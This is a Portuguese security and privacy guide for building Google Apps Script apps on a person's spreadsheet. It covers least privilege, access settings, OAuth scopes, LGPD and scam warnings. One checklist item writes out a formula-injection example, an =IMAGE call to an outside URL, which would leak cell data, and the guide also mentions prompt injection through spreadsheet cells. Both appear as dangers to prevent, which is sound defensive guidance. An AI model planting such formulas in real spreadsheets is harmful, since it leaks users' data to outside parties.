# Segurança e privacidade

Sumário: 1. A ideia central · 2. Checklist do código · 3. Quem tem acesso, por formato · 4. Permissões do Google em linguagem simples · 5. O que dizer à pessoa · 6. Dados pessoais e LGPD · 7. Sinais de golpe

## 1. A ideia central

O código roda **com a conta Google da pessoa**. Tudo que ele consegue fazer, faz em nome dela, inclusive quando outra pessoa usa o app ou quando uma tarefa roda sozinha de madrugada. Por isso a regra é mínimo em tudo: mínimo de gente com acesso, mínimo de permissões, mínimo de dados guardados, mínimo de informação devolvida para a tela.

Quem pede o app geralmente não consegue revisar o código. A segurança tem que vir pronta, e os riscos que sobram precisam ser explicados em linguagem simples, sem assustar e sem esconder. É por isso que a parte sensível mora no núcleo fixo e testado (`arquitetura.md`), e não é reescrita a cada app.

## 2. Checklist do código (antes de entregar)

Rode `scripts/revisar_seguranca.py` quando puder executar código; ele cobre boa parte destes itens e confere se o núcleo e a base estão intactos. Corrija todo `[CORRIGIR]` e olhe cada `[CONFERIR]`. Sem execução de código, passe por esta lista à mão.

1. **Arquivos fixos iguais aos da skill** (Nucleo, Tarefas, base). Nada de ajuste "só para este app" neles: é ali que estão as proteções.
2. **Acesso mínimo.** App da Web pessoal: "Executar como: Eu" e "Quem pode acessar: Somente eu". Planilha e formulário: compartilhar o mínimo (seção 3).
3. **Funções internas terminam com `_`.** No Apps Script, toda função de nível superior sem `_` no fim pode ser chamada pela tela por qualquer pessoa que abre o app da Web, mesmo que a sua tela nunca a chame. Sem `_` ficam só o que a tela chama, `doGet`, as funções públicas dos arquivos fixos (`setup`, `incluir`, `instalarGatilhos`) e as funções de gatilho.
4. **Toda função pública se defende sozinha.** Confere quem chama (`exigirDono_()` em app pessoal e em ações de administrador), valida cada parâmetro com os validadores do núcleo e devolve só os campos que a tela usa. Nunca crie uma função genérica como `lerAba(nome)` ou `executar(funcao)`: ela entrega a planilha inteira para quem descobrir o nome.
5. **O servidor decide, a tela só pede.** Cálculos, regras e conferências (quem ganhou o bingo, quanto sobra no mês) acontecem no App. Valor calculado na tela pode ser forjado.
6. **Texto nunca vira fórmula.** As funções de gravação do núcleo já gravam texto com apóstrofo (`celulaTexto_`). Sem isso, algo como `=IMAGE("https://site.com/?"&B2)` digitado num campo vira fórmula e manda dados da planilha para fora quando ela for aberta. Gravação direta em célula (num `onEdit`, por exemplo) só com número, data em série ou `celulaTexto_`. Nunca use `setFormula` com texto digitado por alguém.
7. **Dado vira texto na tela, nunca HTML.** Use `textContent` ou passe todo dado por `esc()` (da base) antes de montar HTML. Em modelos, `<?= ?>` escapa sozinho; `<?!= ?>` só para `incluir`.
8. **Segredos fora do código.** Chave de API, senha ou token nunca ficam no App, no index ou na planilha. Vão em **Configurações do projeto > Propriedades do script**, e quem cola o valor é a própria pessoa, não você pelo chat. Avise que qualquer pessoa com permissão de edição no projeto vê essas propriedades. Nunca mande `ScriptApp.getOAuthToken()` para a tela.
9. **Nada pessoal escrito no código.** Nem e-mails, nem nomes, nem IDs ou links de planilha. O núcleo guarda o ID da planilha nas propriedades do script pelo `setup`, então a pessoa pode compartilhar o código, até publicar num post, sem expor nada.
10. **Permissões mínimas.** Use só os serviços necessários. GmailApp, DriveApp, UrlFetchApp e CalendarApp pedem permissões fortes; só entram com motivo claro, explicado antes da autorização (seção 4). Não use `@OnlyCurrentDoc`: o app da Web precisa abrir a planilha pelo ID e falharia.
11. **Sem embutir em outros sites.** Não use `setXFrameOptionsMode(ALLOWALL)`, a não ser para embutir no Google Sites. Ele permite que qualquer site coloque o app dentro de uma página e engane a pessoa (clickjacking).
12. **Uma escrita por vez.** As gravações do núcleo já usam a trava. Operação que lê, decide e grava fica inteira dentro de `comTrava_()`.
13. **Sem código de terceiros.** Nada de `<script src>` de outros sites nem bibliotecas do Apps Script de autores desconhecidos: elas rodam com as permissões da pessoa.
14. **Erros sem vazamento.** Mensagens de erro em linguagem simples, sem dados de outras linhas. Não registre dados pessoais em `console.log` / `Logger.log`.
15. **doPost só com motivo.** Um `doPost` aceita dados de qualquer lugar que tenha o link, sem tela. Se precisar (ex.: receber de outro serviço), exija um segredo guardado nas propriedades do script e valide tudo.
16. **Gatilhos com cuidado.** Função de gatilho é pública por necessidade: não recebe dados de fora, não devolve nada e só faz a tarefa dela. E-mails só em texto puro (`body`), nunca HTML montado com dados da planilha.

## 3. Quem tem acesso, por formato

| Formato | Configuração | Por quê |
|---|---|---|
| App da Web pessoal | Executar como: Eu · Quem pode acessar: Somente eu | Só a conta da pessoa abre. É o padrão. |
| App da Web de grupo de conhecidos | Executar como: Eu · Qualquer pessoa com uma Conta do Google | Exige login, o que espanta curiosos. A planilha continua fechada. |
| App da Web de evento aberto | Executar como: Eu · Qualquer pessoa | Qualquer um com o link usa. Só sem dado pessoal e com limites (`apps-em-grupo.md`). |
| Planilha + automações pessoal | Planilha com **Acesso geral: Restrito** | Ninguém mais vê dados nem código. |
| Planilha compartilhada (família, república) | Só pessoas de confiança como editoras | Quem edita a planilha edita o código, e as tarefas rodam com a conta de quem as instalou. |
| Formulário | Link só para quem vai responder; login opcional | A planilha fica fechada; quem responde só vê o formulário. |

Evite "Executar como: usuário que acessa o app": cada pessoa precisaria de acesso à planilha, e quem acessa a planilha vê todos os dados e consegue editar o código.

**No app da Web e no formulário, nunca compartilhe a planilha com quem usa.** As pessoas usam o link. Quem tem permissão de edição na planilha também edita o código, e um gatilho roda sempre o último código salvo com a conta de quem o criou. Na prática, dar edição na planilha é emprestar a própria conta Google.

## 4. Permissões do Google em linguagem simples

Na autorização, o Google mostra frases parecidas com estas. Explique cada uma antes de a pessoa clicar em **Permitir**.

| O código usa | O Google mostra algo como | Explicação para a pessoa |
|---|---|---|
| SpreadsheetApp (todo app) | Ver, editar, criar e excluir todas as suas planilhas | O Google não tem uma permissão "só esta planilha" que funcione em app da Web, então pede todas. O código abre só a planilha do app, pelo ID guardado no setup. |
| Session (conferir o dono) | Ver o endereço de e-mail principal da sua Conta do Google | Para o app reconhecer que é você e barrar os outros. |
| ScriptApp (tarefas automáticas) | Permitir que este aplicativo seja executado quando você não estiver presente | Para lembretes e atualizações que rodam sozinhos. |
| MailApp | Enviar e-mail como você | Para lembretes por e-mail. Limite de 100 destinatários por dia em conta pessoal. |
| UrlFetchApp | Conectar-se a um serviço externo | O app vai falar com um site fora do Google (ex.: uma IA). Diga qual e o que é enviado. |
| DriveApp | Ver, editar, criar e excluir todos os seus arquivos do Google Drive | Permissão forte. Só se o app realmente mexe em arquivos. |
| GmailApp | Ler, escrever, enviar e excluir seus e-mails | Permissão fortíssima. Quase nunca vale a pena num app pequeno. |
| SpreadsheetApp.getUi() (menus) | Exibir e executar conteúdo de terceiros em comandos e barras laterais | Para menus personalizados dentro da planilha (só no computador). |
| `onEdit` simples | nada | Gatilho de edição simples não pede permissão; só mexe na própria planilha. |

## 5. O que dizer à pessoa

Adapte ao app e ao jeito da conversa. São pontos para cobrir, não textos para colar inteiros.

### 5.1 Na tela "O Google não verificou este app"

> Essa tela aparece para qualquer código feito por você mesmo, porque o Google não revisou esse app. Ela existe porque scripts conseguem mexer na sua conta, então vale para qualquer código: só continue quando souber de onde ele veio e o que faz. Este código fui eu que escrevi agora, a partir do seu pedido, e você pode me perguntar o que qualquer parte faz. Clique em **Avançado** e depois em **Acessar [nome do projeto] (não seguro)**. Na tela seguinte, confira as permissões comigo.

Nunca diga que a tela "não significa nada" ou que é "só burocracia". Ela protege a pessoa de golpes, e você quer que ela continue desconfiando de código que chega por outros caminhos.

### 5.2 Ao entregar o app

Um resumo curto, de 4 a 7 pontos, escolhidos para o app em questão:

- **Quem abre:** só a sua conta Google (ou: quem tiver o link e uma conta Google; ou: quem você convidou para a planilha).
- **O link é a chave** (app de grupo e formulário): não poste em lugar público. Para cortar o acesso ao app da Web: **Implantar > Gerenciar implantações > Arquivar**. No formulário: **Respostas > Aceitando respostas** desligado.
- **A planilha fica fechada:** no app da Web e no formulário, não compartilhe com ninguém.
- **Sua conta Google é a fechadura de tudo:** ative a verificação em duas etapas (myaccount.google.com > Segurança).
- **O que o app guarda:** [lista curta]. Evite colocar CPF, número de cartão, senhas ou dados de saúde de outras pessoas.
- **Backup:** **Arquivo > Histórico de versões** na planilha desfaz estragos.
- **Mudanças de código:** só no App, no index e em arquivos do próprio app, enviadas por mim pelo clasp ou coladas inteiras no editor. Desconfie de quem pedir para você colar código que você não sabe de onde veio.

### 5.3 Ao abrir para outras pessoas

- Você é responsável pelos dados que coletar de outras pessoas. Peça o mínimo (um apelido costuma bastar) e apague depois que o evento acabar.
- Teste numa janela anônima ou com outra conta para ver exatamente o que os outros veem.
- No app da Web, todo mundo vê uma faixa do Google dizendo que o app foi criado por um usuário do Apps Script, inclusive você. É normal, e cada pessoa pode fechar.

### 5.4 Antes de colocar IA para ler os dados

- Ao conectar a planilha a um assistente de IA (Gemini, ChatGPT, Claude), os dados passam a ser lidos por essa empresa. Veja nas configurações do assistente se as conversas são usadas para treinar modelos ou revisadas por pessoas, e desligue se preferir.
- Dê à IA o mínimo de acesso: de preferência só leitura, e só da planilha do app.
- Se outras pessoas escrevem na planilha (app de grupo, formulário), alguém pode escrever instruções disfarçadas para a IA num campo de texto. O prompt precisa mandar tratar o conteúdo das células como dado, nunca como ordem (`ia-agendada.md` já traz isso).

## 6. Dados pessoais e LGPD

- Colete só o que o app usa de verdade. Cada coluna nova é uma pergunta: precisa mesmo?
- Dados de outras pessoas (participantes, familiares) pedem mais cuidado: avise o que vai ser guardado e para quê, e apague quando não servir mais.
- Fique longe de CPF, RG, número de cartão, senhas e dados de saúde de terceiros. Se o app realmente precisar disso, provavelmente precisa de algo mais robusto que uma planilha.
- Nada de dados reais em exemplos, prints de tela ou código compartilhado. Ao mostrar o app em público (um post, por exemplo), use dados fictícios ou cubra os valores.

## 7. Sinais de golpe

Ensine a pessoa a desconfiar de:

- Planilha recebida de desconhecidos com "script pronto" pedindo autorização.
- Alguém pedindo para colar um código "para liberar uma função" no editor.
- Tela de autorização pedindo Gmail ou Drive inteiro para um app que não precisa disso.

Na dúvida, cole o código numa conversa com uma IA e pergunte o que ele faz antes de autorizar.
